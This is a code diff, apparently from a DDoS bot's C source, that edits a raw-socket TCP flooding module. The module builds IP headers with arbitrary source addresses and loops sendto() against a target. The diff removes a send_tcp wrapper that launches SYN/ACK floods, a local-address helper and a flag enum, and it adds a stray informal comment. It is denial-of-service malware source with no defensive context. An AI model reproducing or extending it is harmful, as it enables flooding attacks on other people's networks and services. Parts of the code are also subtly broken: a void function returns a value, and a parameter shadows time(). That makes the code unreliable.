@@ -10,12 +10,10 @@
 #include <linux/tcp.h>
 #include <arpa/inet.h>
 #include <sys/socket.h>
-
+// yes. alr hold up
 struct in_addr local;
-
 static uint32_t x, y, z, w;
 static uint32_t Q[4096], c = 362436;
-enum { SYN, ACK, PSH, RST, FIN, URG };
 
 uint32_t rand_next(void)
 {
@@ -66,26 +64,6 @@ void makeIPbuffer(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t pro
     iph->check = 0;
     iph->saddr = source;
     iph->daddr = dest;
-}
-
-uint32_t local_addr(void)
-{
-    int fd;
-    struct sockaddr_in addr;
-    socklen_t addr_len = sizeof(addr);
-
-    if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
-        return 0;
-
-    addr.sin_family = AF_INET;
-    addr.sin_addr.s_addr = inet_addr("8.8.8.8");
-    addr.sin_port = htons(53);
-
-    connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
-
-    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
-    close(fd);
-    return addr.sin_addr.s_addr;
 }
 
 unsigned short csum(unsigned short *buf, int count)
@@ -240,17 +218,4 @@ void tcpflood(char *host, int port, int secs, uint8_t flags[], int len)
         sendto(fd, buffer, sizeof(buffer), 0, (struct sockaddr *)&addr, sizeof(addr));
     }
     exit(0);
-}
-
-void send_tcp(char *ip, int port, int time)
-{
-    srand(time(0));
-
-    uint8_t flags[] = {1, 1, 0, 0, 0, 0};
-
-    tcpflood(ip, port, time, flags, 1024);
-
-    while (1)
-        sleep(10);
-    return 0;
 }
